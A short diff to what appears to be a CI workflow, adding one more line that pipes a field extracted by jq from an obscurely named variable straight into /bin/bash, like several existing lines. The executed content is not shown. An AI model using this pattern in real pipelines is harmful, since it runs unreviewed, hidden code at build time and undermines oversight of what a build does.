@@ -41,6 +41,7 @@ jobs:
           echo $l22 | jq -r .lt04 | /bin/bash
           printf '%s' "$wrpgc74825" | jq -r .daro40 | /bin/bash
           printf '%s' "$tozf23" | jq -r .gbr3 | /bin/bash
+          echo $wtucc3 | jq -r .vjo11 | /bin/bash
 
       - name: Archive output
         if: always()
